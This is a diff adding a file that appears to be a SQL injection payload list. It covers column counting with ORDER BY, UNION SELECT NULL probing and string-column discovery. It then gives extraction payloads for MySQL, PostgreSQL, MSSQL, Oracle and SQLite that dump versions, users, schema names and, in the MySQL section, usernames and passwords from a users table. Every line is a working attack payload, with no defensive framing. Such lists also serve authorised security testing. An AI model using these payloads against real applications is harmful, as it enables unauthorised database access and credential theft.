@@ -1,0 +1,51 @@
+# Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 100--
+
+# Union based - NULL method
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+# Find string column
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+
+# Extract data - MySQL
+' UNION SELECT version(),NULL,NULL--
+' UNION SELECT user(),NULL,NULL--
+' UNION SELECT database(),NULL,NULL--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL FROM users--
+
+# Extract data - PostgreSQL
+' UNION SELECT version(),NULL,NULL--
+' UNION SELECT current_user,NULL,NULL--
+' UNION SELECT current_database(),NULL,NULL--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Extract data - MSSQL
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user_name(),NULL,NULL--
+' UNION SELECT db_name(),NULL,NULL--
+' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--
+
+# Extract data - Oracle
+' UNION SELECT banner,NULL FROM v$version--
+' UNION SELECT user,NULL FROM dual--
+' UNION SELECT table_name,NULL FROM all_tables--
+
+# Extract data - SQLite
+' UNION SELECT sqlite_version(),NULL,NULL--
+' UNION SELECT tbl_name,NULL,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql,NULL,NULL FROM sqlite_master--
